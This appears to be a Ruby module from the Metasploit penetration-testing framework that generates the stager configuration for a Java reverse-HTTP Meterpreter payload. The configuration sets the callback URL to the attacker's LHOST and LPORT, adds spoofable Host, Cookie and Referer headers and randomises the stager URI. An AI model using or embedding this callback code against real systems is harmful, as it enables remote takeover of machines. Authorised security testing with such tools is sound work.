# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/transport_config'
require 'msf/core/payload/uuid/options'

module Msf

###
#
# Complex payload generation for Java that speaks HTTP(S)
#
###

module Payload::Java::ReverseHttp

  include Msf::Payload::TransportConfig
  include Msf::Payload::Java
  include Msf::Payload::UUID::Options

  #
  # Register Java reverse_http specific options
  #
  def initialize(*args)
    super
    register_advanced_options([
      OptInt.new('Spawn', [true, 'Number of subprocesses to spawn', 2]),
      OptInt.new('StagerURILength', [false, 'The URI length for the stager (at least 5 bytes)']),
      OptString.new('HttpHeaderHost', [false, 'An optional value to use for the Host HTTP header']),
      OptString.new('HttpHeaderCookie', [false, 'An optional value to use for the Cookie HTTP header']),
      OptString.new('HttpHeaderReferer', [false, 'An optional value to use for the Referer HTTP header']),
    ])
  end

  #
  # Generate the transport-specific configuration
  #
  def transport_config(opts={})
    transport_config_reverse_http(opts)
  end

  #
  # Generate the URI for the initial stager
  #
  def generate_uri(opts={})
    ds = opts[:datastore] || datastore
    uri_req_len = ds['StagerURILength'].to_i

    # Choose a random URI length between 30 and 255 bytes
    if uri_req_len == 0
      uri_req_len = 30 + luri.length + rand(256 - (30 + luri.length))
    end

    if uri_req_len < 5
      raise ArgumentError, "Minimum StagerURILength is 5"
    end

    generate_uri_uuid_mode(:init_java, uri_req_len)
  end

  #
  # Generate configuration that is to be included in the stager.
  #
  def stager_config(opts={})
    uri = generate_uri(opts)
    ds = opts[:datastore] || datastore

    c =  ''
    c << "Spawn=#{ds["Spawn"] || 2}\n"
    c << "HeaderUser-Agent=#{ds["MeterpreterUserAgent"]}\n" if ds["MeterpreterUserAgent"]
    c << "HeaderHost=#{ds["HttpHeaderHost"]}\n" if ds["HttpHeaderHost"]
    c << "HeaderReferer=#{ds["HttpHeaderReferer"]}\n" if ds["HttpHeaderReferer"]
    c << "HeaderCookie=#{ds["HttpHeaderCookie"]}\n" if ds["HttpHeaderCookie"]
    c << "URL=#{scheme}://#{ds['LHOST']}"
    c << ":#{ds['LPORT']}" if ds['LPORT']
    c << luri
    c << uri
    c << "\n"

    c
  end

  #
  # Scheme defaults to http
  #
  def scheme
    'http'
  end

  #
  # Always wait at least 20 seconds for this payload (due to staging delays)
  #
  def wfs_delay
    20
  end

end

end


